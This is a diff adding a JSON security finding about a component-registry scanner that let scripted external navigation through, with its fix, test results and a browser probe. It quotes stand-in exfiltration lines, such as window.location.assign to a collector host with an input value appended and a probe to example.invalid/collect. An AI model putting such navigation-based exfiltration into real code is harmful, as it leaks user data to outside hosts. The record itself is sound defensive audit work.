@@ -1,0 +1,67 @@
+{
+  "finding": "SEC-37-109",
+  "severity": "medium",
+  "title": "Registry gate allowed programmatic external navigation",
+  "status": "fixed_locally",
+  "captured_at": "2026-10-21T21:35:30Z",
+  "reproduction": {
+    "before_fix": [
+      "window.location.assign('https://collector.example.test/?value=' + inputValue) returned pass",
+      "location.replace(destination) returned pass when destination was unresolved",
+      "Reflect.apply(location.assign, location, ['https://docs.example.test/guide']) returned pass"
+    ],
+    "after_fix": [
+      "Dynamic or unresolved assign/replace destinations fail the source-isolation gate",
+      "Remote and unresolved location.href writes fail the source-isolation gate",
+      "Reflect.apply, Reflect.set, Object.defineProperty, and Object.assign navigation paths fail closed",
+      "Fragment-only location changes and explicit external anchor links remain allowed"
+    ],
+    "red_before_fix": "The new registry-gate cases failed before implementation; they pass after the fix."
+  },
+  "root_cause": "The scanner rejected executable and active-document URL schemes but treated ordinary HTTPS and unresolved programmatic navigation as safe. The preview permits scripts in an opaque sandbox and connect-src does not restrict navigation.",
+  "affected_files": [
+    "packages/registry-gate/src/checks/isolation-check.ts",
+    "packages/registry-gate/src/__tests__/registry-gate.test.ts",
+    "packages/cli/src/__tests__/black-box.test.ts"
+  ],
+  "remediation": "Reject unresolved or non-fragment programmatic navigation. Preserve ordinary external anchors so the user explicitly activates navigation.",
+  "local_validation": {
+    "focused_registry_gate": "72/72 passed",
+    "registry_gate_cli_black_box": "17/17 passed; a valid Button resource with window.location.assign(destination) returns a rejected JSON report and nonzero process status",
+    "workspace_typecheck_after_cli_regression": "22/22 packages passed",
+    "changed_test_eslint": "passed",
+    "full_unit_suite": "1198 passed across 76 files, including the new CLI black-box regression",
+    "typecheck": "22/22 workspace packages passed",
+    "lint": "passed",
+    "preview_csp_browser_suite": "18/18 passed across desktop and mobile Chromium",
+    "resource_isolation": "324/324 passed; zero findings",
+    "audit_all": "passed all 16 behavioral gates, production build, bundle budgets, provenance, secrets/security, and dependency checks"
+  },
+  "untrusted_source_executed": false,
+  "last_cli_admission_verification_at": "2026-10-21T21:49:53Z",
+  "deployed_verification": "pending release-candidate deployment and hostile-preview navigation recheck",
+  "browser_runtime_probe": {
+    "runtime": "Local Sites Worker preview at the current workspace build; not the deployed public Site.",
+    "viewports": [
+      "1440x900",
+      "390x844"
+    ],
+    "embedded_preview": {
+      "route": "/explore with /preview/?resource=accordion in its opaque iframe",
+      "attempted_destination": "https://example.invalid/collect?value=preview-probe-only",
+      "request_observed_by_browser": "false",
+      "result": "Parent app-shell frame-src blocked navigation before a request was emitted.",
+      "console": "Expected CSP frame-src violation from the deliberately injected security probe."
+    },
+    "top_level_preview": {
+      "route": "/preview/?resource=button opened as a top-level page",
+      "attempted_destination": "https://example.invalid/collect?value=preview-probe-only",
+      "request_observed_by_playwright": "true",
+      "network_left_laptop": "false",
+      "result": "Playwright route interception aborted the dummy request with net::ERR_BLOCKED_BY_CLIENT before network access; the preview tab then displayed chrome-error.",
+      "uncaught_page_errors": []
+    },
+    "csp_navigation_directive": "An exploratory navigate-to none header was reported as an unrecognized directive by Chromium and did not block the attempted navigation.",
+    "secret_or_untrusted_data_used": false
+  }
+}
